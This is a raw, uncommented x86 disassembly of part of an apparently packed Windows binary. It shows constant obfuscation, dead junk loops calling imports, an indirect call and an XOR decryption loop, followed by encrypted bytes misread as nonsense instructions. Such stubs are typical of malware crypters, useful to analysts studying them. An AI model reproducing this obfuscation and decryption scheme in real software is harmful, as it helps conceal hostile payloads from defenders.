  410982:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  410989:	mov    ebx,DWORD PTR [ebp-0x4]
  41098c:	mov    ecx,DWORD PTR [ebp-0x8]
  41098f:	mov    edx,DWORD PTR [ebp-0x8]
  410992:	xor    edx,esi
  410994:	xor    ecx,esi
  410996:	add    ecx,edx
  410998:	mov    edx,DWORD PTR [ebp-0x8]
  41099b:	xor    ebx,esi
  41099d:	xor    edx,esi
  41099f:	add    ebx,edi
  4109a1:	lea    ecx,[ecx+edx*1+0x975891]
  4109a8:	cmp    ebx,ecx
  4109aa:	ja     0x410a0b
  4109b0:	mov    eax,DWORD PTR [ebp-0x8]
  4109b3:	xor    eax,esi
  4109b5:	lea    eax,[eax+ebx*1+0x3272db]
  4109bc:	push   eax
  4109bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4109c0:	xor    eax,esi
  4109c2:	lea    eax,[ebp+eax*1+0x3272e3]
  4109c9:	push   eax
  4109ca:	mov    eax,ds:0x41d3dc
  4109cf:	push   DWORD PTR [eax+0x1bc]
  4109d5:	call   0x403ce8
  4109da:	mov    eax,DWORD PTR [ebp-0x8]
  4109dd:	xor    eax,esi
  4109df:	lea    ebx,[ebx+eax*1+0x3272db]
  4109e6:	mov    eax,DWORD PTR [ebp-0x8]
  4109e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4109ec:	xor    ecx,esi
  4109ee:	xor    eax,esi
  4109f0:	add    eax,ecx
  4109f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4109f5:	xor    ecx,esi
  4109f7:	lea    eax,[eax+ecx*1+0x975891]
  4109fe:	cmp    ebx,eax
  410a00:	jbe    0x4109b0
  410a06:	mov    eax,0xf89c85ba
  410a0b:	mov    ecx,DWORD PTR [ebp+0xc]
  410a0e:	mov    DWORD PTR ds:0x41d260,ecx
  410a14:	mov    ecx,DWORD PTR [ebp+0x10]
  410a17:	mov    DWORD PTR ds:0x41d4b4,ecx
  410a1d:	mov    ecx,DWORD PTR ds:0x41d260
  410a23:	mov    edx,DWORD PTR [ebp-0x20]
  410a26:	sub    ecx,edi
  410a28:	xor    ecx,esi
  410a2a:	mov    DWORD PTR [edx],ecx
  410a2c:	mov    edx,DWORD PTR [ebp-0xc]
  410a2f:	mov    ecx,0xf89c85b6
  410a34:	cmp    edx,ecx
  410a36:	jne    0x410a61
  410a3c:	lea    eax,[ebp-0x14]
  410a3f:	mov    DWORD PTR [ebp-0x24],eax
  410a42:	lea    eax,[ebp+0x4]
  410a45:	mov    DWORD PTR [ebp-0x14],eax
  410a48:	mov    eax,DWORD PTR [ebp-0x14]
  410a4b:	test   eax,eax
  410a4d:	je     0x410b76
  410a53:	mov    eax,DWORD PTR [ebp-0x10]
  410a56:	mov    eax,DWORD PTR [ebp-0x8]
  410a59:	lea    eax,[ebp-0x24]
  410a5c:	jmp    0x410b6d
  410a61:	mov    edx,DWORD PTR [ebp-0x28]
  410a64:	cmp    edx,0xf89c85b5
  410a6a:	je     0x410ac7
  410a70:	mov    edx,DWORD PTR [ebp-0x4]
  410a73:	mov    ebx,DWORD PTR [ebp-0x2c]
  410a76:	xor    edx,esi
  410a78:	add    edx,edi
  410a7a:	cmp    edx,ebx
  410a7c:	je     0x410ac7
  410a82:	mov    eax,ds:0x41d3dc
  410a87:	mov    eax,DWORD PTR [eax+0x194]
  410a8d:	mov    ecx,DWORD PTR [eax]
  410a8f:	mov    eax,DWORD PTR [ecx+0x3c]
  410a92:	push   DWORD PTR ds:0x41d4b4
  410a98:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  410a9c:	push   DWORD PTR ds:0x41d260
  410aa2:	add    eax,ecx
  410aa4:	mov    ecx,DWORD PTR ds:0x41d3dc
  410aaa:	mov    ecx,DWORD PTR [ecx+0x194]
  410ab0:	push   DWORD PTR [ecx]
  410ab2:	call   eax
  410ab4:	mov    ecx,DWORD PTR ds:0x41d3dc
  410aba:	mov    ecx,DWORD PTR [ecx+0x1cc]
  410ac0:	mov    DWORD PTR [ecx],eax
  410ac2:	jmp    0x410b76
  410ac7:	mov    edx,DWORD PTR [ebp-0x4]
  410aca:	mov    ebx,DWORD PTR [ebp-0x30]
  410acd:	xor    edx,esi
  410acf:	add    edx,edi
  410ad1:	cmp    edx,ebx
  410ad3:	jne    0x410b2c
  410ad9:	mov    edx,DWORD PTR [ebp-0x4]
  410adc:	mov    ebx,DWORD PTR ds:0x41d3dc
  410ae2:	mov    ebx,DWORD PTR [ebx+0x198]
  410ae8:	xor    edx,esi
  410aea:	add    edx,edi
  410aec:	cmp    edx,DWORD PTR [ebx]
  410aee:	jne    0x410b09
  410af4:	push   ecx
  410af5:	mov    ecx,DWORD PTR [ebp-0x4]
  410af8:	xor    ecx,esi
  410afa:	add    ecx,edi
  410afc:	push   ecx
  410afd:	push   eax
  410afe:	push   DWORD PTR [ebp-0x8]
  410b01:	push   DWORD PTR [ebp-0x4]
  410b04:	call   0x40b7a6
  410b09:	push   DWORD PTR [ebp-0x8]
  410b0c:	push   DWORD PTR [ebp-0x4]
  410b0f:	call   0x410b98
  410b14:	mov    eax,DWORD PTR [ebp-0x4]
  410b17:	xor    eax,esi
  410b19:	add    eax,edi
  410b1b:	mov    ds:0x41d460,eax
  410b20:	mov    eax,DWORD PTR [ebp-0x4]
  410b23:	xor    eax,esi
  410b25:	add    eax,edi
  410b27:	mov    ds:0x41d458,eax
  410b2c:	lea    eax,[ebp-0x18]
  410b2f:	mov    DWORD PTR [ebp-0x34],eax
  410b32:	lea    eax,[ebp+0x4]
  410b35:	mov    DWORD PTR [ebp-0x18],eax
  410b38:	mov    eax,DWORD PTR [ebp-0x18]
  410b3b:	test   eax,eax
  410b3d:	je     0x410b76
  410b43:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  410b4a:	mov    DWORD PTR [ebp-0x40],0x712ed08
  410b51:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  410b58:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  410b5f:	call   0x40b3b6
  410b64:	mov    eax,DWORD PTR [ebp-0x10]
  410b67:	mov    eax,DWORD PTR [ebp-0x8]
  410b6a:	lea    eax,[ebp-0x34]
  410b6d:	push   eax
  410b6e:	push   DWORD PTR [ebp-0x4]
  410b71:	call   0x40b1b5
  410b76:	mov    eax,ds:0x41d3dc
  410b7b:	push   0x4
  410b7d:	add    eax,0x1cc
  410b82:	push   eax
  410b83:	lea    eax,[ebp-0x10]
  410b86:	push   eax
  410b87:	call   0x403ce8
  410b8c:	mov    eax,DWORD PTR [ebp-0x10]
  410b8f:	mov    eax,DWORD PTR [eax]
  410b91:	pop    edi
  410b92:	pop    esi
  410b93:	pop    ebx
  410b94:	leave  
  410b95:	ret    0xc
  410b98:	push   ebp
  410b99:	mov    ebp,esp
  410b9b:	sub    esp,0x98
  410ba1:	mov    eax,DWORD PTR [ebp+0x8]
  410ba4:	mov    ecx,DWORD PTR ds:0x42601c
  410baa:	or     DWORD PTR ds:0x425008,ecx
  410bb0:	push   ebx
  410bb1:	push   esi
  410bb2:	and    ecx,esi
  410bb4:	push   edi
  410bb5:	inc    ecx
  410bb6:	mov    esi,0x7510893
  410bbb:	xor    eax,esi
  410bbd:	mov    edi,0x3272db
  410bc2:	add    eax,edi
  410bc4:	and    DWORD PTR ds:0x42800c,0x0
  410bce:	jmp    0x410be0
  410bd3:	mov    ecx,DWORD PTR ds:0x42800c
  410bd9:	inc    ecx
  410bda:	mov    DWORD PTR ds:0x42800c,ecx
  410be0:	cmp    DWORD PTR ds:0x42800c,0x18
  410be7:	jae    0x410c21
  410bed:	cmp    DWORD PTR ds:0x42800c,0x1f
  410bf4:	jne    0x410c1c
  410bfa:	push   0x41ff8d
  410bff:	push   0x7ac7
  410c04:	push   0x1b99
  410c09:	push   0x1d9a
  410c0e:	push   DWORD PTR [ebp-0x10]
  410c11:	push   0x26f8
  410c16:	call   DWORD PTR ds:0x42104c
  410c1c:	jmp    0x410bd3
  410c21:	mov    DWORD PTR [ebp-0x30],eax
  410c24:	sub    eax,eax
  410c26:	mov    eax,ds:0x41d25c
  410c2b:	sbb    DWORD PTR ds:0x42801c,edi
  410c31:	mov    eax,DWORD PTR [eax]
  410c33:	mov    DWORD PTR [ebp-0x20],eax
  410c36:	and    DWORD PTR ds:0x426004,0x0
  410c40:	mov    ecx,DWORD PTR ds:0x426004
  410c46:	inc    ecx
  410c47:	mov    DWORD PTR ds:0x426004,ecx
  410c4d:	cmp    DWORD PTR ds:0x426004,0x21
  410c54:	jne    0x410c65
  410c5a:	push   0x2993
  410c5f:	call   DWORD PTR ds:0x421014
  410c65:	cmp    DWORD PTR ds:0x426004,0x1d
  410c6c:	jb     0x410c40
  410c72:	mov    DWORD PTR ds:0x425024,0x1a
  410c7c:	cmp    DWORD PTR ds:0x425024,0x0
  410c83:	je     0x410ccd
  410c89:	cmp    DWORD PTR ds:0x425024,0x8
  410c90:	jne    0x410ca1
  410c96:	push   0x8b04
  410c9b:	call   DWORD PTR ds:0x421018
  410ca1:	cmp    DWORD PTR ds:0x425024,0x9
  410ca8:	jne    0x410cbb
  410cae:	mov    ecx,DWORD PTR ds:0x425024
  410cb4:	dec    ecx
  410cb5:	mov    DWORD PTR ds:0x425024,ecx
  410cbb:	mov    ecx,DWORD PTR ds:0x425024
  410cc1:	dec    ecx
  410cc2:	mov    DWORD PTR ds:0x425024,ecx
  410cc8:	jmp    0x410c7c
  410ccd:	mov    eax,ds:0x41d464
  410cd2:	inc    ecx
  410cd3:	mov    eax,DWORD PTR [eax]
  410cd5:	mov    DWORD PTR [ebp-0x28],eax
  410cd8:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  410cdf:	sbb    DWORD PTR ds:0x42601c,0xf37
  410ce9:	mov    eax,DWORD PTR [ebp-0x38]
  410cec:	and    DWORD PTR ds:0x42900c,0x0
  410cf6:	mov    ecx,DWORD PTR ds:0x42900c
  410cfc:	inc    ecx
  410cfd:	mov    DWORD PTR ds:0x42900c,ecx
  410d03:	cmp    DWORD PTR ds:0x42900c,0x6
  410d0a:	jne    0x410d24
  410d10:	push   0x133c
  410d15:	push   DWORD PTR [ebp-0x14]
  410d18:	push   DWORD PTR [ebp-0x24]
  410d1b:	push   DWORD PTR [ebp-0x18]
  410d1e:	call   DWORD PTR ds:0x42101c
  410d24:	cmp    DWORD PTR ds:0x42900c,0x5
  410d2b:	jne    0x410d40
  410d31:	xor    ecx,ecx
  410d33:	xor    ecx,DWORD PTR ds:0x42900c
  410d39:	inc    ecx
  410d3a:	mov    DWORD PTR ds:0x42900c,ecx
  410d40:	cmp    DWORD PTR ds:0x42900c,0x1b
  410d47:	jb     0x410cf6
  410d4d:	xor    eax,esi
  410d4f:	and    DWORD PTR ds:0x429010,0x2e08
  410d59:	add    eax,edi
  410d5b:	mov    DWORD PTR [ebp-0x30],eax
  410d5e:	sbb    eax,eax
  410d60:	mov    eax,ds:0x41d3dc
  410d65:	sbb    DWORD PTR ds:0x428018,0x460c
  410d6f:	mov    DWORD PTR [ebp-0x30],eax
  410d72:	add    eax,0xded
  410d77:	mov    eax,DWORD PTR [ebp-0x20]
  410d7a:	mov    DWORD PTR [ebp-0x14],eax
  410d7d:	sbb    DWORD PTR ds:0x42501c,0x3470
  410d87:	mov    eax,DWORD PTR [ebp-0x14]
  410d8a:	and    DWORD PTR ds:0x428018,0x0
  410d94:	jmp    0x410da6
  410d99:	mov    ecx,DWORD PTR ds:0x428018
  410d9f:	inc    ecx
  410da0:	mov    DWORD PTR ds:0x428018,ecx
  410da6:	cmp    DWORD PTR ds:0x428018,0x15
  410dad:	jae    0x410df5
  410db3:	cmp    DWORD PTR ds:0x428018,0x6
  410dba:	jne    0x410dd0
  410dc0:	push   0x41ffef
  410dc5:	push   0x41ffd1
  410dca:	call   DWORD PTR ds:0x421050
  410dd0:	cmp    DWORD PTR ds:0x428018,0x5
  410dd7:	jne    0x410dea
  410ddd:	mov    ecx,DWORD PTR ds:0x428018
  410de3:	inc    ecx
  410de4:	mov    DWORD PTR ds:0x428018,ecx
  410dea:	jmp    0x410d99
  410def:	and    DWORD PTR ds:0x426000,ecx
  410df5:	push   0x4
  410df7:	pop    ecx
  410df8:	sub    ecx,eax
  410dfa:	add    ecx,DWORD PTR [ebp-0x28]
  410dfd:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  410e04:	mov    DWORD PTR [ebp-0x24],ecx
  410e07:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  410e11:	or     DWORD PTR ds:0x427000,edx
  410e17:	mov    eax,DWORD PTR [ebp-0x14]
  410e1a:	xor    DWORD PTR ds:0x429010,0x390a
  410e24:	mov    DWORD PTR [ebp-0x94],eax
  410e2a:	sbb    DWORD PTR ds:0x425020,0x44b0
  410e34:	mov    eax,DWORD PTR [ebp-0x24]
  410e37:	mov    DWORD PTR [ebp-0x90],eax
  410e3d:	mov    DWORD PTR ds:0x429010,0x17
  410e47:	cmp    DWORD PTR ds:0x429010,0x0
  410e4e:	je     0x410ede
  410e54:	cmp    DWORD PTR ds:0x429010,0x5
  410e5b:	jne    0x410e6f
  410e61:	push   DWORD PTR [ebp-0x24]
  410e64:	push   0x823f
  410e69:	call   DWORD PTR ds:0x421054
  410e6f:	cmp    DWORD PTR ds:0x429010,0x6
  410e76:	jne    0x410e87
  410e7c:	mov    eax,ds:0x429010
  410e81:	dec    eax
  410e82:	mov    ds:0x429010,eax
  410e87:	mov    eax,ds:0x429010
  410e8c:	dec    eax
  410e8d:	mov    ds:0x429010,eax
  410e92:	jmp    0x410e47
  410e97:	and    DWORD PTR ds:0x429004,0x0
  410ea1:	jmp    0x410eb1
  410ea6:	mov    eax,ds:0x429004
  410eab:	inc    eax
  410eac:	mov    ds:0x429004,eax
  410eb1:	cmp    DWORD PTR ds:0x429004,0x18
  410eb8:	jae    0x410ede
  410ebe:	cmp    DWORD PTR ds:0x429004,0x26
  410ec5:	jne    0x410ed9
  410ecb:	push   0x42801c
  410ed0:	push   DWORD PTR [ebp-0x18]
  410ed3:	call   DWORD PTR ds:0x421058
  410ed9:	jmp    0x410ea6
  410ede:	mov    eax,DWORD PTR [ebp-0x2c]
  410ee1:	or     DWORD PTR ds:0x429014,0x2e7c
  410eeb:	xor    eax,esi
  410eed:	add    eax,edi
  410eef:	mov    DWORD PTR [ebp-0x8c],eax
  410ef5:	lea    eax,[ebp-0x50]
  410ef8:	mov    DWORD PTR [ebp-0x88],eax
  410efe:	xor    DWORD PTR ds:0x425000,0x42600c
  410f08:	mov    eax,DWORD PTR [ebp-0x98]
  410f0e:	xor    DWORD PTR ds:0x42900c,0x426014
  410f18:	xor    eax,esi
  410f1a:	add    eax,edi
  410f1c:	adc    DWORD PTR ds:0x426008,0x425014
  410f26:	mov    DWORD PTR [ebp-0x98],eax
  410f2c:	lea    eax,[ebp-0x98]
  410f32:	adc    DWORD PTR ds:0x427018,0x426018
  410f3c:	push   eax
  410f3d:	adc    DWORD PTR ds:0x426004,0x2a7
  410f47:	mov    eax,DWORD PTR [ebp+0xc]
  410f4a:	sub    DWORD PTR ds:0x429010,0x42501c
  410f54:	xor    eax,esi
  410f56:	add    DWORD PTR ds:0x425020,0x427018
  410f60:	add    eax,edi
  410f62:	xor    DWORD PTR ds:0x42501c,0x425000
  410f6c:	push   eax
  410f6d:	mov    DWORD PTR ds:0x429010,0x1047
  410f77:	mov    eax,ds:0x41d3fc
  410f7c:	and    DWORD PTR ds:0x425018,0x428010
  410f86:	push   0x41d352
  410f8b:	push   DWORD PTR [eax]
  410f8d:	call   0x403f26
  410f92:	sub    eax,DWORD PTR ds:0x427000
  410f98:	mov    eax,DWORD PTR [ebp-0x14]
  410f9b:	adc    ecx,DWORD PTR ds:0x425008
  410fa1:	mov    ecx,DWORD PTR [ebp-0x24]
  410fa4:	xor    DWORD PTR ds:0x429010,0x42900c
  410fae:	mov    DWORD PTR [ebp-0x4c],ecx
  410fb1:	mov    ecx,DWORD PTR [ebp+0x8]
  410fb4:	adc    DWORD PTR ds:0x425010,0x425014
  410fbe:	xor    ecx,esi
  410fc0:	add    DWORD PTR ds:0x428018,0x42900c
  410fca:	mov    DWORD PTR [ebp-0x38],eax
  410fcd:	add    ecx,edi
  410fcf:	mov    DWORD PTR ds:0x427000,0x74a5
  410fd9:	jmp    0x41374e
  410fde:	and    DWORD PTR ds:0x426008,0x0
  410fe8:	mov    ebx,DWORD PTR ds:0x426008
  410fee:	inc    ebx
  410fef:	mov    DWORD PTR ds:0x426008,ebx
  410ff5:	cmp    DWORD PTR ds:0x426008,0x15
  410ffc:	jne    0x411017
  411002:	push   0x42900c
  411007:	push   0x429010
  41100c:	push   0x5fed
  411011:	call   DWORD PTR ds:0x42105c
  411017:	cmp    DWORD PTR ds:0x426008,0x12
  41101e:	jb     0x410fe8
  411024:	and    DWORD PTR ds:0x426004,0x0
  41102e:	xor    ebx,ebx
  411030:	add    ebx,DWORD PTR ds:0x426004
  411036:	inc    ebx
  411037:	mov    DWORD PTR ds:0x426004,ebx
  41103d:	cmp    DWORD PTR ds:0x426004,0x20
  411044:	jne    0x41105d
  41104a:	push   DWORD PTR [ebp-0x20]
  41104d:	push   0x6608
  411052:	push   0x1aeb
  411057:	call   DWORD PTR ds:0x421020
  41105d:	cmp    DWORD PTR ds:0x426004,0x10
  411064:	jb     0x41102e
  41106a:	adc    DWORD PTR ds:0x427018,ecx
  411070:	lea    edx,[ecx+eax*1]
  411073:	sbb    DWORD PTR ds:0x428018,0x5978
  41107d:	mov    DWORD PTR [ebp-0x28],edx
  411080:	mov    edx,DWORD PTR ds:0x41d1f8
  411086:	mov    ebx,DWORD PTR ds:0x41d1fc
  41108c:	sub    ebx,edx
  41108e:	sub    edx,DWORD PTR [edx+ebx*1]
  411091:	mov    edx,DWORD PTR [ebp-0x4c]
  411094:	and    DWORD PTR ds:0x426018,0x0
  41109e:	jmp    0x4110b0
  4110a3:	mov    ebx,DWORD PTR ds:0x426018
  4110a9:	inc    ebx
  4110aa:	mov    DWORD PTR ds:0x426018,ebx
  4110b0:	cmp    DWORD PTR ds:0x426018,0x16
  4110b7:	jae    0x4110e2
  4110bd:	cmp    DWORD PTR ds:0x426018,0x18
  4110c4:	jne    0x4110dd
  4110ca:	push   0x4880
  4110cf:	push   DWORD PTR [ebp-0x1c]
  4110d2:	push   0x14f0
  4110d7:	call   DWORD PTR ds:0x421028
  4110dd:	jmp    0x4110a3
  4110e2:	sub    edx,ecx
  4110e4:	xor    ebx,DWORD PTR ds:0x429004
  4110ea:	mov    DWORD PTR [ebp-0x20],edx
  4110ed:	and    DWORD PTR ds:0x427004,0x0
  4110f7:	mov    ebx,DWORD PTR ds:0x427004
  4110fd:	inc    ebx
  4110fe:	mov    DWORD PTR ds:0x427004,ebx
  411104:	cmp    DWORD PTR ds:0x427004,0x7
  41110b:	jne    0x41111c
  411111:	push   0x41ff2e
  411116:	call   DWORD PTR ds:0x42102c
  41111c:	cmp    DWORD PTR ds:0x427004,0x6
  411123:	jne    0x411136
  411129:	mov    ebx,DWORD PTR ds:0x427004
  41112f:	inc    ebx
  411130:	mov    DWORD PTR ds:0x427004,ebx
  411136:	cmp    DWORD PTR ds:0x427004,0x16
  41113d:	jb     0x4110f7
  411143:	movzx  edx,WORD PTR ds:0x428014
  41114a:	sbb    DWORD PTR ds:0x425000,edx
  411150:	mov    edx,DWORD PTR [ebp-0x20]
  411153:	or     ebx,0x6caa
  411159:	mov    DWORD PTR [ebp-0x14],edx
  41115c:	mov    edx,DWORD PTR [ebp-0x28]
  41115f:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  411166:	mov    DWORD PTR [ebp-0x44],edx
  411169:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411170:	mov    edx,DWORD PTR [ebp-0x34]
  411173:	xor    edx,esi
  411175:	add    edx,edi
  411177:	mov    DWORD PTR [ebp-0x10],edx
  41117a:	mov    edx,DWORD PTR [ebp-0x34]
  41117d:	xor    edx,esi
  41117f:	add    edx,edi
  411181:	mov    DWORD PTR [ebp-0x8],edx
  411184:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41118b:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  411192:	mov    edx,DWORD PTR [ebp-0x34]
  411195:	mov    ebx,DWORD PTR [ebp-0x14]
  411198:	xor    edx,esi
  41119a:	add    edx,edi
  41119c:	cmp    ebx,edx
  41119e:	je     0x413742
  4111a4:	mov    eax,DWORD PTR [ebp-0x18]
  4111a7:	xor    eax,esi
  4111a9:	mov    edx,0xffcd8d25
  4111ae:	sub    edx,eax
  4111b0:	add    edx,DWORD PTR [ebp-0x14]
  4111b3:	mov    eax,DWORD PTR [ebp-0x18]
  4111b6:	mov    ebx,DWORD PTR [ebp-0x10]
  4111b9:	xor    eax,esi
  4111bb:	add    eax,edi
  4111bd:	imul   eax,ebx
  4111c0:	cmp    eax,edx
  4111c2:	ja     0x41373f
  4111c8:	mov    edx,DWORD PTR [ebp-0x10]
  4111cb:	mov    eax,DWORD PTR [ebp-0x14]
  4111ce:	mov    ebx,DWORD PTR [ebp-0x28]
  4111d1:	sub    eax,edx
  4111d3:	xor    ebx,esi
  4111d5:	xor    edx,edx
  4111d7:	add    ebx,edi
  4111d9:	div    ebx
  4111db:	mov    DWORD PTR [ebp-0x8],eax
  4111de:	mov    eax,DWORD PTR [ebp-0x2c]
  4111e1:	mov    edx,DWORD PTR [ebp-0x8]
  4111e4:	xor    eax,esi
  4111e6:	add    eax,edi
  4111e8:	cmp    edx,eax
  4111ea:	jbe    0x4111fa
  4111f0:	mov    eax,DWORD PTR [ebp-0x2c]
  4111f3:	xor    eax,esi
  4111f5:	add    eax,edi
  4111f7:	mov    DWORD PTR [ebp-0x8],eax
  4111fa:	mov    eax,DWORD PTR [ebp-0x28]
  4111fd:	mov    edx,DWORD PTR [ebp-0x8]
  411200:	xor    eax,esi
  411202:	add    eax,edi
  411204:	imul   eax,edx
  411207:	mov    DWORD PTR [ebp-0x8],eax
  41120a:	mov    eax,DWORD PTR [ebp-0x34]
  41120d:	mov    edx,DWORD PTR [ebp-0x8]
  411210:	xor    eax,esi
  411212:	add    eax,edi
  411214:	cmp    edx,eax
  411216:	je     0x413728
  41121c:	mov    eax,DWORD PTR [ebp-0x8]
  41121f:	mov    DWORD PTR [ebp-0x24],eax
  411222:	mov    eax,DWORD PTR [ebp-0x10]
  411225:	add    eax,DWORD PTR [ebp-0x44]
  411228:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41122f:	mov    DWORD PTR [ebp-0x8],eax
  411232:	mov    eax,0xf89c85b5
  411237:	mov    DWORD PTR [ebp-0x3c],eax
  41123a:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  411241:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  411248:	mov    DWORD PTR [ebp-0x1c],eax
  41124b:	mov    eax,DWORD PTR [ebp-0x20]
  41124e:	xor    eax,esi
  411250:	add    eax,edi
  411252:	jmp    0x4136e4
  411257:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41125e:	mov    eax,DWORD PTR [ebp-0x1c]
  411261:	mov    edx,DWORD PTR [ebp-0xc]
  411264:	xor    eax,esi
  411266:	add    eax,edi
  411268:	imul   eax,edx
  41126b:	mov    edx,DWORD PTR [ebp-0x8]
  41126e:	mov    al,BYTE PTR [eax+edx*1]
  411271:	mov    BYTE PTR [ebp-0x1],al
  411274:	mov    eax,DWORD PTR [ebp-0x1c]
  411277:	mov    edx,DWORD PTR [ebp-0xc]
  41127a:	xor    eax,esi
  41127c:	add    eax,edi
  41127e:	imul   eax,edx
  411281:	mov    edx,DWORD PTR [ebp-0x40]
  411284:	xor    edx,esi
  411286:	add    eax,edx
  411288:	mov    edx,DWORD PTR [ebp-0x8]
  41128b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  411293:	mov    edx,DWORD PTR [ebp-0x48]
  411296:	xor    edx,esi
  411298:	lea    eax,[edx+eax*1+0x3272db]
  41129f:	movzx  edx,BYTE PTR [ebp-0x1]
  4112a3:	xor    edx,eax
  4112a5:	mov    BYTE PTR [ebp-0x1],dl
  4112a8:	mov    al,BYTE PTR [ebp-0x1]
  4112ab:	mov    edx,DWORD PTR [ebp-0x1c]
  4112ae:	mov    ebx,DWORD PTR [ebp-0xc]
  4112b1:	xor    edx,esi
  4112b3:	add    edx,edi
  4112b5:	imul   edx,ebx
  4112b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4112bb:	mov    BYTE PTR [edx+ebx*1],al
  4112be:	mov    eax,DWORD PTR [ebp-0x1c]
  4112c1:	mov    edx,DWORD PTR [ebp-0xc]
  4112c4:	xor    eax,esi
  4112c6:	add    eax,edi
  4112c8:	imul   eax,edx
  4112cb:	mov    edx,DWORD PTR [ebp-0x8]
  4112ce:	mov    al,BYTE PTR [eax+edx*1]
  4112d1:	mov    BYTE PTR [ebp-0x1],al
  4112d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4112d7:	mov    edx,DWORD PTR [ebp-0xc]
  4112da:	xor    eax,esi
  4112dc:	add    eax,edi
  4112de:	imul   eax,edx
  4112e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4112e4:	xor    edx,esi
  4112e6:	add    eax,edx
  4112e8:	mov    edx,DWORD PTR [ebp-0x8]
  4112eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  4112f3:	mov    edx,DWORD PTR [ebp-0x54]
  4112f6:	xor    edx,esi
  4112f8:	lea    eax,[edx+eax*1+0x3272db]
  4112ff:	movzx  edx,BYTE PTR [ebp-0x1]
  411303:	xor    edx,eax
  411305:	mov    BYTE PTR [ebp-0x1],dl
  411308:	mov    al,BYTE PTR [ebp-0x1]
  41130b:	mov    edx,DWORD PTR [ebp-0x1c]
  41130e:	jmp    0x4136c0
  411313:	cli    
  411314:	jl     0x411300
  411316:	popa   
  411317:	fs jecxz 0x411383
  41131a:	repz push eax
  41131c:	push   esp
  41131d:	and    eax,0x657feed3
  411322:	inc    edx
  411323:	push   edi
  411324:	mov    fs,WORD PTR [edx+0x62]
  411327:	int    0x5f
  411329:	bound  esp,QWORD PTR [edx-0x68]
  41132c:	nop
  41132d:	lahf   
  41132e:	xor    ch,BYTE PTR [edx+ebx*4]
  411331:	fdivr  QWORD PTR ds:0x2a57d5eb
  411337:	call   0xf3aff576
  41133c:	popa   
  41133d:	add    ebx,eax
  41133f:	pop    edi
  411340:	sub    dh,BYTE PTR [ebp+0x59]
  411343:	enter  0xec3d,0xa8
  411347:	push   ebx
  411348:	mov    esp,0x9c36c4ae
  41134d:	mov    dh,0x75
  41134f:	das    
  411350:	push   ecx
  411351:	sub    cl,dl
  411353:	rcl    BYTE PTR [edx],0x45
  411356:	mov    esp,esi
  411358:	push   eax
  411359:	pop    ebx
  41135a:	pushf  
  41135b:	fs loope 0x41136d
  41135e:	and    eax,0xc884965b
  411363:	mov    bh,0x46
  411365:	inc    ebp
  411366:	das    
  411367:	inc    ecx
  411368:	data16 mov bh,0xf9
  41136b:	fsub   QWORD PTR [ebx-0x55]
  41136e:	sbb    DWORD PTR [eax],eax
  411370:	xchg   esi,eax
  411371:	icebp  
  411372:	jecxz  0x411309
  411374:	mov    bh,0x78
  411376:	or     al,0xbe
  411378:	daa    
  411379:	push   ebx
  41137a:	mov    ch,0xc5
  41137c:	jg     0x41130c
  41137e:	mov    edx,0x14f83519
  411383:	pop    edi
  411384:	pop    esp
  411385:	lea    eax,[ebp-0x1f0025a]
  41138b:	push   edx
  41138c:	pop    esp
  41138d:	fld    st(7)
  41138f:	pop    esi
  411390:	(bad)  
  411392:	add    eax,0xd31a5e
  411397:	stos   DWORD PTR es:[edi],eax
  411398:	aaa    
  411399:	add    al,0x9d
  41139b:	xchg   edx,eax
  41139c:	fisttp WORD PTR [esp+edi*8+0xea1c5]
  4113a3:	push   es
  4113a4:	mov    ecx,0x18b7cf69
  4113a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113aa:	test   eax,0xce242fc1
  4113af:	pop    ss
  4113b0:	(bad)  
  4113b1:	cmp    al,al
  4113b3:	cli    
  4113b4:	and    edx,esi
  4113b6:	lods   al,BYTE PTR ds:[esi]
  4113b7:	js     0x411416
  4113b9:	xchg   ebx,eax
  4113ba:	setae  bh
  4113bd:	push   0xe21cfeff
  4113c2:	fiadd  DWORD PTR [ecx-0x1943e0dc]
  4113c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113c9:	mov    bl,0xd7
  4113cb:	jbe    0x411381
  4113cd:	jmp    0x37fd:0xe32189bb
  4113d4:	xchg   ebp,eax
  4113d5:	sbb    al,0x2c
  4113d7:	pop    ebx
  4113d8:	pop    ebp
  4113d9:	pop    ss
  4113da:	lock int 0x49
  4113dd:	xor    DWORD PTR [edx],ebx
  4113df:	out    0x9f,eax
  4113e1:	sub    edx,DWORD PTR [ebx]
  4113e3:	pop    es
  4113e4:	or     al,0x1
  4113e6:	xchg   esi,eax
  4113e7:	sub    DWORD PTR [edi+ebx*8],ecx
  4113ea:	(bad)  
  4113eb:	pushf  
  4113ec:	mov    ch,0x9f
  4113ee:	rcl    DWORD PTR [edi+0xdb8617],0x8c
  4113f5:	mov    edi,0x21f60652
  4113fa:	dec    ebp
  4113fb:	pop    edx
  4113fc:	pop    ds
  4113fd:	sbb    ecx,DWORD PTR [edx+0x71]
  411400:	nop
  411401:	popf   
  411402:	xor    BYTE PTR ds:0x410acc65,dl
  411408:	pop    edi
  411409:	cwde   
  41140a:	and    DWORD PTR [ecx+edx*2-0x4],esp
  41140e:	shl    BYTE PTR ds:0x234192bf,cl
  411414:	sub    ebx,edi
  411416:	stos   DWORD PTR es:[edi],eax
